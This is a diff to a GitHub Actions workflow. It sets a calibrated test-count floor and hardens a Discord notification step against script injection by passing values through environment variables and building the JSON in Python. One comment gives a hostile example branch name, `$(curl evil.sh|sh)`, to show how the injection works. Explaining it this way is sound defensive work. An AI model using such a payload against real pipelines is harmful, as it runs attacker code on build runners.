@@ -72,13 +72,13 @@ jobs:
           passed=$(grep -oE 'test result: ok\. [0-9]+ passed' /tmp/test.log \
                    | awk '{s+=$4} END {print s+0}')
           echo "passed=$passed elapsed=${elapsed}s"
-          # The floor is deliberately blank until a green run establishes it.
-          # A number guessed now would either never bite or bite wrongly, and a
-          # gate that has never been calibrated is the thing this project keeps
-          # getting caught by. The clock check below is what catches the real
-          # failure mode meanwhile — a suite that "passes" without compiling.
-          if [ "$passed" -eq 0 ]; then
-            echo "::error::no tests ran at all"
+          # **250, from a measured baseline of 294** — the three crates run
+          # 294 tests locally as of 2026-08-30. The floor sits below that with
+          # room for a genuinely removed test, and far enough above zero that a
+          # suite which silently stops collecting cannot pass. A floor picked by
+          # guesswork is a gate that never bites; this one has a number behind it.
+          if [ "$passed" -lt 250 ]; then
+            echo "::error::only $passed tests ran; the baseline is 294"
             exit 1
           fi
           if [ "$elapsed" -lt 5 ]; then
@@ -130,18 +130,34 @@ jobs:
       - name: Post the result to Discord
         env:
           HOOK: ${{ secrets.DISCORD_WEBHOOK }}
+          # **Every one of these is an env var and none is interpolated into the
+          # script below.** `${{ github.ref_name }}` expands before the shell sees
+          # it, and a branch name is chosen by whoever pushes — a branch called
+          # `$(curl evil.sh|sh)` would otherwise run on this runner. Passing them
+          # through `env:` and reading them as `"$VAR"` is what makes that inert.
+          # This matters more here than on a solo repo: the whole point of this
+          # file is that other people push branches to it.
+          BUILD: ${{ needs.build-check.result }}
+          SECRETS: ${{ needs.no-secrets.result }}
+          REF: ${{ github.ref_name }}
+          ACTOR: ${{ github.actor }}
+          SHA: ${{ github.sha }}
         run: |
           [ -n "$HOOK" ] || { echo "no webhook configured; nothing to post"; exit 0; }
-          build='${{ needs.build-check.result }}'
-          secrets='${{ needs.no-secrets.result }}'
-          if [ "$build" = "success" ] && [ "$secrets" = "success" ]; then
-            msg="✅ **gates green** on \`${{ github.ref_name }}\` — build-check and no-secrets both passed."
-          else
-            msg="🔴 **gates failed** on \`${{ github.ref_name }}\` — build-check: \`$build\`, no-secrets: \`$secrets\`. Pushed by **${{ github.actor }}**."
-          fi
-          body=$(printf '%s\n%s' "$msg" "\`${{ github.sha }}\`")
-          # `--fail` so a rejected post is a failed step rather than a silent no-op.
+          # The message is assembled in Python from the environment, never by
+          # string-pasting into shell. json.dumps also escapes anything odd in a
+          # branch name so it cannot break the payload.
+          python3 - <<'PY' > /tmp/payload.json
+          import json, os
+          build, secrets = os.environ["BUILD"], os.environ["SECRETS"]
+          ref, actor, sha = os.environ["REF"], os.environ["ACTOR"], os.environ["SHA"]
+          if build == "success" and secrets == "success":
+              msg = f"\u2705 **gates green** on `{ref}` \u2014 build-check and no-secrets both passed."
+          else:
+              msg = (f"\U0001F534 **gates failed** on `{ref}` \u2014 build-check: `{build}`, "
+                     f"no-secrets: `{secrets}`. Pushed by **{actor}**.")
+          print(json.dumps({"content": f"{msg}\n`{sha[:8]}`"}))
+          PY
+          # `--fail` so a rejected post fails the step instead of passing quietly.
           curl -sS --fail -X POST "$HOOK" -H 'Content-Type: application/json' \
-            --data "$(python3 -c '
-import json,sys
-print(json.dumps({"content": sys.argv[1]}))' "$body")"
+            --data @/tmp/payload.json
